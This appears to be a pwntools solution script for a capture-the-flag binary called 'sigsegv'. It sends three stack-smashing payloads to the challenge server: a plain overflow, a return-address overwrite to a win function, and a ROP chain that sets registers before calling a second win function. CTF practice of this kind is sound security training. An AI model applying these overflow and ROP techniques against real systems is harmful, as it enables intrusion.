#!/usr/bin/python3
from pwn import *

context.clear(arch="amd64")

RHOST, RPORT = "nc.ctf.unitedctf.ca", 4000

prog = ELF("./challenge/sigsegv")
rop = ROP(prog)

# Part 1
r = remote(RHOST, RPORT)
r.recvuntil(b"Now, it's stack smashing time: ")
r.sendline(b"A" * 64)
r.success(r.recvline().decode())
r.close()

# Part 2
r = remote(RHOST, RPORT)
r.recvuntil(b"Now, it's stack smashing time: ")
r.sendline(b"A" * 40 + p64(prog.sym.win1))
r.success(r.recvline().decode())
r.close()

# Part 3
payload = flat(
    b"A" * 40,
    p64(rop.rdi.address),
    p64(0x1337133713371337),
    p64(rop.rsi.address),
    p64(0),
    p64(0),
    p64(prog.sym.win2),
)
r = remote(RHOST, RPORT)
r.recvuntil(b"Now, it's stack smashing time: ")
r.sendline(payload)
r.success(r.recvline().decode())
r.close()
